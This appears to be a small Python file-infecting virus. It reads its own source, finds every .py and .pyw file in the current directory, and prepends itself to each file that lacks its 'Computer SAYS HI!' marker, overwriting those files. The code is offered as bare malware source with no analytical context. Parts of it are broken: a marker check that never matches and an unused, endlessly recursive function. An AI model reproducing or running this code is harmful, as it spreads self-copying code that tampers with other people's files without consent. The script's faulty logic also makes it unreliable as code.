# Computer SAYS HI!

import sys
import glob

computer_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# Computer SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        computer_code.append(line)
    if line == "# Computer SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# Computer SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(computer_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
def runner_code():
 
    runner_code()

# Computer SAYS BYE!